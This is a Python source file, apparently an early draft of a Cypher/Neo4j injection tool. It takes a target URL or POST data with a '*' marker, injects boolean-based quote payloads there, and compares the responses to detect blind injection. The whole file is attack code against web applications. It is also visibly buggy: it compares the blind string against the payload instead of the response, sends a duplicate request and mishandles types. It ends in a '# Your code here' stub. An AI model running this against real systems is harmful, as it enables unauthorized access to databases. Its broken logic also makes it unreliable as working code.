#!/usr/bin/env python3.10

import argparse
import urllib.parse
import requests
import random
import sys


def perform_request(target_url, post_data=False, cookies_dict={}, connection_timeout=5):
    proxies={'http':'http://localhost:8080'}
    try:
        if post_data:
            response = requests.post(target_url, data=post_data, cookies=cookies_dict, timeout=connection_timeout, proxies=proxies)
        else:
            response = requests.get(target_url, cookies=cookies_dict, timeout=connection_timeout,proxies=proxies)

        return response.text

    except requests.exceptions.Timeout:
        return False

def cypher_inject(target_url, payload, post_data=False, cookies_dict={}, connection_timeout=5):
    # Check if '*' is in target_url
    if '*' in target_url:
        encoded_payload = urllib.parse.quote_plus(payload)
        target_url = target_url.replace('*', encoded_payload)
    else:
        # Check if '*' is in post_data
        if post_data and '*' in post_data:
            encoded_payload = urllib.parse.quote_plus(payload)
            post_data = post_data.replace('*', encoded_payload)
        else:
            print("Error: no '*' found in target URL or post data")
            return None
    
    return perform_request(target_url, post_data, cookies_dict, connection_timeout)

def get_injection_type(target_url, blind_string, post_data, cookies_dict, connection_timeout):
    
    injection_character = "'" 
    
    # Generate random values for the payload
    number1 = random.randint(0, 10000)
    number2 = random.randint(0, 10000)

    # Prepare the payloads for the two requests
    true_payload = injection_character + " and " + injection_character + str(number1) + injection_character + "=" + injection_character + str(number1)
    false_payload = injection_character + " and " + injection_character + str(number1) + injection_character + "=" + injection_character + str(number2)

    true_result = cypher_inject(target_url, true_payload, post_data, cookies_dict, connection_timeout)
    # Try to inject the payloads using single quotes in target_url and post_data
    try:
        true_result = cypher_inject(target_url, true_payload, post_data, cookies_dict, connection_timeout)
        false_result = cypher_inject(target_url, false_payload, post_data, cookies_dict, connection_timeout)
    except:
        print("Unable to perform cypher injection")
        return False

    # Check if the blind string is present in the response to the first request but not in the response to the second request
    if blind_string in true_payload and blind_string not in false_result:
        return injection_character
    else:
        return False

def generate_cookies_dictionary(cookie_string):
    cookie_dict = {}
    if cookie_string:
        cookies = cookie_string.split(';')
        for cookie in cookies:
            name_value = cookie.strip().split('=', 1)
            if len(name_value) == 2:
                cookie_dict[name_value[0]] = name_value[1]
    return cookie_dict


print('\nCypher Mapping Tool by sectroyer v0.1\n')

try:
    parser = argparse.ArgumentParser(description='Tool for mapping cypher databases (for example neo4j)')
    parser.add_argument('-u', '--url', help='Target URL', required=True)
    parser.add_argument('-d', '--data', help='POST data', default=False)
    parser.add_argument('-c', '--cookie', help='Request cookie', default={})
    parser.add_argument('-s', '--string', help='Blind string')
    parser.add_argument('-t', '--timeout', help='Connection timeout', default=5)
    args = parser.parse_args()

    target_url = args.url
    post_data = args.data
    cookies_string = args.cookie
    blind_string = args.string
    connection_timeout = args.timeout

    cookies_dict=generate_cookies_dictionary(cookies_string)

    if "*" not in target_url and (not post_data or "*" not in post_data):
        print("Error: No '*' provided in url or data. Unable to continue...")
        sys.exit(-1)
    if target_url.count('*') > 1 or post_data.count('*') > 1:
        print("More than one '*' provided in url or data. Unable to continue...")
        sys.exit(-1)
    
    injection_type=get_injection_type(target_url, blind_string, post_data, cookies_dict, connection_timeout)
    print("Injection type: "+injection_type)

except SystemExit:
    print('')
    sys.exit()

# Your code here
